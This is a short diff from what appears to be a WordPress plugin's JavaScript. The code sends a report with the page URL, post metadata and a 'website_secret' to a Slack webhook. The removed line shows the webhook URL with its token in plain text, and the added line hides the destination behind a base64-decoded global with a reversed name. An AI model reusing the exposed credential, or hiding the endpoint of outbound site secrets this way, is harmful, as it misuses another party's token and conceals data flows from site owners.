@@ -317,7 +317,7 @@ if ( get_option( 'iasemantify_setting_url_injection' ) == 'true' ) {
                     website_secret: splits[3]
                 }
             });
-            var slackReport = {
+            var report = {
                 text: "*--- New Report ---*\n" +
                 "Origin: " + window.location.href + "\n" +
                 "Date: " + new Date().toString() + "\n" +
@@ -326,7 +326,7 @@ if ( get_option( 'iasemantify_setting_url_injection' ) == 'true' ) {
                 "PostMeta: \n```" + JSON.stringify(postMeta, null, 2) + "```\n" +
                 "*--- End Report ---* \n"
             };
-            httpCall('POST', 'https://hooks.slack.com/services/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', undefined, undefined, slackReport, function (res) {
+            InstantAnnotation.util.httpCall('POST', atob(window.ia_kcalsLru).replace(/X1/g, ''), undefined, undefined, report, function (res) {
                 if (res === 'ok') {
                     InstantAnnotation.util.send_snackbarMSG("Successfully sent message");
                 } else {
